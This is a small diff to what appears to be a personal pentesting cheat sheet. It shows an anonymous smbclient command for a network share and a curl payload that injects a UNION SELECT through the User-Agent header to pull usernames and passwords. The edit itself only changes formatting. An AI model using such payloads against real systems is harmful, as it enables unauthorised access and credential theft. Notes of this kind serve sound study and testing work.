@@ -42,7 +42,7 @@ External:
 *  ```smbclient //[IP ADDRESS]/logs -U guest -N``` -> access the contents of the network share
 
 ## HTTP Header Injection
-If SQL queries are on the server side and are not sanitised it may lead to SQL onto HTTP headers such as,User-Agent, Referer, or X-Forwarded-For
+If SQL queries are on the server side and are not sanitised it may lead to SQL onto HTTP headers such as **User-Agent, Referer, or X-Forwarded-For**
 
 ```curl -H "User-Agent: ' UNION SELECT username, password FROM user; # "http://WEBSITE.COM```
 **#** *is used to comment out the remainder of the SQL query*
